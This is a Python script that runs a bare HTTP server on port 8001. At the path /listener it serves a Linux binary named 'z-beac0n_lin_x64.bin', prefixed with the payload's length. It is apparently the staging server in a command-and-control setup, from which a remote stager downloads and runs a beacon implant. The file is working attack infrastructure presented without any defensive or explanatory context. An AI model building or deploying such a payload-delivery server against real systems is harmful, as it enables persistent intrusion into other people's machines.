import http.server
import socketserver
import struct
import os
from urllib.parse import urlparse

PORT = 8001
FILENAME="z-beac0n_lin_x64.bin"

class ZHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # setting Headers
        self.send_response(200)
        self.send_header("Content-type", "octet/stream")
        self.end_headers()

        # extract path from request
        url_path = urlparse(self.path).path

        # serve payload content from a file
        # prepend it with payload's length sent as unsigned int
        if url_path == "/listener":
            with open("./" + FILENAME, 'rb') as f:

                f.seek(0, os.SEEK_END)
                payload_len = struct.pack('<I', f.tell())
                self.wfile.write(payload_len)

                f.seek(0)
                payload = f.read(1024)
                while (payload):
                    self.wfile.write(payload)
                    payload = f.read(1024)

        return

#
# Start serving requests
#

http_custom_handler = ZHttpRequestHandler

srv = socketserver.TCPServer(("", PORT), http_custom_handler)
srv.serve_forever()
